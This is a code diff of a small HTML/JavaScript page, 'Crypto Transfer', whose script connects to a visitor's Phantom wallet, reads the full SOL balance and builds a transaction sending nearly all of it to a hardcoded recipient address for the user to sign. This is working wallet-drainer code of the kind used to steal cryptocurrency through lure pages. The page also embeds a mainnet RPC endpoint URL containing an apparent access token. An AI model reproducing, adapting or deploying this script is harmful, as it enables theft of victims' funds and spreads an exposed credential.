@@ -1,87 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Transfer</title>
-    
-    <!-- Solana Web3.js for Phantom Wallet -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+<script>
+    document.getElementById('transferButton').addEventListener('click', async () => {
+        // Check if Phantom is available
+        const isPhantomInstalled = window.solana && window.solana.isPhantom;
+        if (!isPhantomInstalled) {
+            alert('Phantom Wallet not found. Please install Phantom from https://phantom.app/');
+            return;
+        }
 
-    <!-- Buffer Polyfill for Mobile Browsers -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
-    <script>
-        window.Buffer = window.Buffer || require('buffer').Buffer;
-    </script>
+        try {
+            // Connect to Phantom Wallet
+            const provider = window.solana;
+            if (!provider.isConnected) {
+                await provider.connect();
+            }
+            
+            const publicKey = provider.publicKey;
+            if (!publicKey) {
+                throw new Error('Failed to get public key.');
+            }
 
-    <link rel="icon" href="data:,">
-</head>
-<body>
-    <h1>Click below to transfer all SOL</h1>
-    <button id="transferButton">Transfer Now</button>
+            // Connect to Solana Network
+            const connection = new solanaWeb3.Connection(
+                'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
+                'confirmed'
+            );
 
-    <script>
-        document.getElementById('transferButton').addEventListener('click', async () => {
-            // Check if Phantom wallet is installed
-            if (!window.solana || !window.solana.isPhantom) {
-                alert('Phantom Wallet not found. Please install Phantom.');
+            // Get wallet balance
+            const balance = await connection.getBalance(publicKey);
+            if (balance <= 5000) {
+                alert('Insufficient SOL balance to cover transaction fees.');
                 return;
             }
 
-            try {
-                // Ensure Buffer is loaded for mobile devices
-                if (typeof Buffer === "undefined") {
-                    alert("Buffer is not defined. Please try again.");
-                    return;
-                }
+            // Define recipient wallet
+            const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
 
-                // Connect to Phantom Wallet
-                await window.solana.connect();
-                const publicKey = window.solana.publicKey;
-                if (!publicKey) {
-                    throw new Error('Failed to get public key.');
-                }
+            // Create transfer transaction
+            const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: publicKey,
+                    toPubkey: recipient,
+                    lamports: balance - 5000 // Subtract estimated fee
+                })
+            );
 
-                // Connect to Solana RPC (QuickNode)
-                const connection = new solanaWeb3.Connection(
-                    'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
-                    'confirmed'
-                );
+            transaction.feePayer = publicKey;
+            const { blockhash } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
 
-                // Get Wallet Balance
-                const balance = await connection.getBalance(publicKey);
-                if (balance <= 5000) { // Ensure enough balance to cover transaction fee
-                    alert('Insufficient SOL balance.');
-                    return;
-                }
+            // Sign and send transaction
+            const signedTransaction = await provider.signTransaction(transaction);
+            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
-                // Define the recipient wallet
-                const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
-
-                // Create Transaction to Transfer SOL
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: recipient,
-                        lamports: balance - 5000 // Deduct transaction fee
-                    })
-                );
-
-                transaction.feePayer = publicKey;
-                const { blockhash } = await connection.getLatestBlockhash();
-                transaction.recentBlockhash = blockhash;
-
-                // Sign & Send the Transaction
-                const signedTransaction = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
-                await connection.confirmTransaction(signature);
-
-                alert(`Transaction successful! Signature: ${signature}`);
-            } catch (error) {
-                alert(`Transaction failed: ${error.message}`);
-            }
-        });
-    </script>
-</body>
-</html>
+            await connection.confirmTransaction(signature);
+            alert(`Transaction successful! Signature: ${signature}`);
+        } catch (error) {
+            alert(`Transaction failed: ${error.message}`);
+        }
+    });
+</script>
